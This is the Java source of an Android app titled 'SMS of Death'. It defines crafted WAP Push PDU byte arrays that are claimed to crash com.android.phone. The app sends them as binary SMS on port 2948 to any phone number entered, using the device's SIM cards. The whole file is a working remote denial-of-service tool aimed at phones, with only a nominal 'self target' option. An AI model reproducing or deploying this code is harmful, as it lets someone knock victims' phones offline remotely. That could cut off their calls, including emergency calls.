package com.markb.wappushcrash;

import android.Manifest;
import android.app.Activity;
import android.content.ClipData;
import android.content.ClipboardManager;
import android.content.Context;
import android.content.pm.PackageManager;
import android.os.Bundle;
import android.telephony.SmsManager;
import android.telephony.SubscriptionInfo;
import android.telephony.SubscriptionManager;
import android.view.View;
import android.widget.AdapterView;
import android.widget.ArrayAdapter;
import android.widget.Button;
import android.widget.EditText;
import android.widget.Spinner;
import android.widget.TextView;
import android.widget.Toast;

import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.List;
import java.util.Locale;

/**
 * WAP Push Remote Modem Crash Lab (SMS of Death)
 *
 * Transmits crafted WAP Push PDUs on port 2948 to cause
 * NegativeArraySizeException or buffer corruption in com.android.phone.
 */
public class MainActivity extends Activity {

    // Standard 8-byte PDU triggering NegativeArraySizeException in WapPushOverSms.decodeWapPdu line 244
    private static final byte[] CRASH_PDU_STANDARD = {
        0x01, 0x06, (byte) 0x88, (byte) 0x80, (byte) 0x80, (byte) 0x80, 0x00, (byte) 0xBE
    };

    // Extended aggressive variant with truncated header fields
    private static final byte[] CRASH_PDU_AGGRESSIVE = {
        0x01, 0x06, (byte) 0x99, (byte) 0xFF, (byte) 0x80, (byte) 0x80, 0x01, (byte) 0xBE
    };

    private static final String[] PDU_PROFILES = {
        "Standard Crash PDU (NegativeArraySize · 8 bytes)",
        "Aggressive Header Overflow Variant"
    };

    private EditText phoneInput;
    private Spinner senderSpinner;
    private Spinner pduProfileSpinner;
    private TextView statusText;
    private TextView badgeStatus;
    private List<SubscriptionInfo> subs;
    private final StringBuilder logBuffer = new StringBuilder();

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        phoneInput = findViewById(R.id.phone_input);
        senderSpinner = findViewById(R.id.sender_spinner);
        pduProfileSpinner = findViewById(R.id.pdu_profile_spinner);
        statusText = findViewById(R.id.status_text);
        badgeStatus = findViewById(R.id.badge_status);

        Button btnSendCrash = findViewById(R.id.btn_send_crash);
        Button btnSelfTarget = findViewById(R.id.btn_self_target);
        Button btnClear = findViewById(R.id.btn_clear);
        TextView btnCopyLogs = findViewById(R.id.btn_copy_logs);

        ArrayAdapter<String> pduAdapter = new ArrayAdapter<>(this,
                android.R.layout.simple_spinner_item, PDU_PROFILES);
        pduAdapter.setDropDownViewResource(android.R.layout.simple_spinner_dropdown_item);
        pduProfileSpinner.setAdapter(pduAdapter);

        btnSendCrash.setOnClickListener(v -> sendCrashSms());
        btnSelfTarget.setOnClickListener(v -> autofillSelfNumber());
        btnClear.setOnClickListener(v -> {
            phoneInput.setText("");
            appendLog("Target cleared.");
        });

        btnCopyLogs.setOnClickListener(v -> {
            ClipboardManager cm = (ClipboardManager) getSystemService(Context.CLIPBOARD_SERVICE);
            if (cm != null) {
                cm.setPrimaryClip(ClipData.newPlainText("Crash Logs", statusText.getText().toString()));
                Toast.makeText(this, "Logs copied to clipboard!", Toast.LENGTH_SHORT).show();
            }
        });

        appendLog("SMS of Death Initialized.");
        requestPermissions(new String[]{
            Manifest.permission.SEND_SMS,
            Manifest.permission.READ_PHONE_NUMBERS,
            Manifest.permission.READ_PHONE_STATE
        }, 1);

        populateSubsAndAutofill();
    }

    private void appendLog(String msg) {
        String ts = new SimpleDateFormat("HH:mm:ss", Locale.US).format(new Date());
        String entry = "[" + ts + "] " + msg;
        if (logBuffer.length() > 0) {
            logBuffer.insert(0, entry + "\n\n");
        } else {
            logBuffer.append(entry);
        }
        if (statusText != null) {
            statusText.setText(logBuffer.toString());
        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        populateSubsAndAutofill();
    }

    private void populateSubsAndAutofill() {
        try {
            SubscriptionManager sm = (SubscriptionManager)
                getSystemService(Context.TELEPHONY_SUBSCRIPTION_SERVICE);
            if (sm == null) return;

            if (checkSelfPermission(Manifest.permission.READ_PHONE_STATE) != PackageManager.PERMISSION_GRANTED) {
                appendLog("⚠️ READ_PHONE_STATE required to enumerate active SIM cards.");
                return;
            }

            subs = sm.getActiveSubscriptionInfoList();
            if (subs == null || subs.isEmpty()) {
                appendLog("⚠️ No active SIM cards detected on device.");
                badgeStatus.setText("NO SIM");
                badgeStatus.setTextColor(0xFFFF5252);
                return;
            }

            badgeStatus.setText("SIM COUNT: " + subs.size());
            badgeStatus.setTextColor(0xFF00FFC2);

            String[] items = new String[subs.size()];
            for (int i = 0; i < subs.size(); i++) {
                SubscriptionInfo s = subs.get(i);
                items[i] = "Slot " + s.getSimSlotIndex() + " · " + s.getDisplayName()
                    + " (subId " + s.getSubscriptionId() + ")";
            }
            ArrayAdapter<String> adapter = new ArrayAdapter<>(this,
                android.R.layout.simple_spinner_item, items);
            adapter.setDropDownViewResource(android.R.layout.simple_spinner_dropdown_item);
            senderSpinner.setAdapter(adapter);

            senderSpinner.setOnItemSelectedListener(new AdapterView.OnItemSelectedListener() {
                @Override
                public void onItemSelected(AdapterView<?> parent, View view, int position, long id) {
                    autofillDestForSender(position);
                }
                @Override
                public void onNothingSelected(AdapterView<?> parent) {}
            });

            autofillDestForSender(senderSpinner.getSelectedItemPosition());
        } catch (SecurityException e) {
            appendLog("SecurityException: " + e.getMessage());
        } catch (Exception e) {
            appendLog("Auto-fill error: " + e.getMessage());
        }
    }

    private String resolveNumber(SubscriptionInfo s) {
        if (s == null) return null;
        SubscriptionManager sm = (SubscriptionManager)
            getSystemService(Context.TELEPHONY_SUBSCRIPTION_SERVICE);
        int subId = s.getSubscriptionId();
        try {
            String n = sm.getPhoneNumber(subId);
            if (n != null && !n.isEmpty()) return n;
        } catch (Exception ignored) {}

        int[] sources = {
            SubscriptionManager.PHONE_NUMBER_SOURCE_IMS,
            SubscriptionManager.PHONE_NUMBER_SOURCE_CARRIER,
            SubscriptionManager.PHONE_NUMBER_SOURCE_UICC
        };
        for (int src : sources) {
            try {
                String n = sm.getPhoneNumber(subId, src);
                if (n != null && !n.isEmpty()) return n;
            } catch (Exception ignored) {}
        }
        return s.getNumber();
    }

    private void autofillSelfNumber() {
        if (subs == null || subs.isEmpty()) return;
        int pos = senderSpinner.getSelectedItemPosition();
        if (pos < 0 || pos >= subs.size()) pos = 0;
        String n = resolveNumber(subs.get(pos));
        if (n != null && !n.isEmpty()) {
            phoneInput.setText(n);
            appendLog("Set target to active SIM (" + subs.get(pos).getDisplayName() + "): " + n);
        } else {
            appendLog("Could not resolve phone number for selected SIM.");
        }
    }

    private void autofillDestForSender(int senderPos) {
        if (subs == null || subs.isEmpty()) return;
        if (senderPos < 0 || senderPos >= subs.size()) senderPos = 0;
        String autoNum = null;
        int chosenIdx = -1;

        for (int i = 0; i < subs.size(); i++) {
            if (i == senderPos) continue;
            String n = resolveNumber(subs.get(i));
            if (n != null && !n.isEmpty()) {
                autoNum = n;
                chosenIdx = i;
                break;
            }
        }
        if (autoNum == null && !subs.isEmpty()) {
            String n = resolveNumber(subs.get(senderPos));
            if (n != null && !n.isEmpty()) {
                autoNum = n;
                chosenIdx = senderPos;
            }
        }
        if (autoNum != null) {
            phoneInput.setText(autoNum);
            appendLog("Auto-filled target from SIM " + chosenIdx + " (" + subs.get(chosenIdx).getDisplayName() + "): " + autoNum);
        } else {
            appendLog("No MSISDN reported by SIM carrier. Please enter manually.");
        }
    }

    private void sendCrashSms() {
        String dest = phoneInput.getText().toString().trim();
        if (dest.isEmpty()) {
            appendLog("❌ Target phone number cannot be blank.");
            Toast.makeText(this, "Enter target phone number", Toast.LENGTH_SHORT).show();
            return;
        }
        if (checkSelfPermission(Manifest.permission.SEND_SMS) != PackageManager.PERMISSION_GRANTED) {
            appendLog("❌ SEND_SMS permission denied.");
            return;
        }
        if (subs == null || subs.isEmpty()) {
            appendLog("❌ No active SIM subscriptions found.");
            return;
        }
        try {
            int pos = senderSpinner.getSelectedItemPosition();
            if (pos < 0 || pos >= subs.size()) pos = 0;
            int subId = subs.get(pos).getSubscriptionId();

            byte[] payload = (pduProfileSpinner.getSelectedItemPosition() == 1)
                ? CRASH_PDU_AGGRESSIVE
                : CRASH_PDU_STANDARD;

            SmsManager mgr = getSystemService(SmsManager.class).createForSubscriptionId(subId);
            mgr.sendDataMessage(dest, null, (short) 2948, payload, null, null);

            appendLog("⚡ PDU TRANSMITTED SUCCESS!\n" +
                    "  Target: " + dest + "\n" +
                    "  Outbound: Slot " + subs.get(pos).getSimSlotIndex() + " (" + subs.get(pos).getDisplayName() + ")\n" +
                    "  Port: 2948\n" +
                    "  Size: " + payload.length + " bytes\n" +
                    "  Profile: " + PDU_PROFILES[pduProfileSpinner.getSelectedItemPosition()]);

            Toast.makeText(this, "WAP Push PDU sent to " + dest, Toast.LENGTH_SHORT).show();
        } catch (SecurityException e) {
            appendLog("SecurityException: " + e.getMessage());
        } catch (Exception e) {
            appendLog("Transmission Error: " + e.getMessage());
        }
    }
}
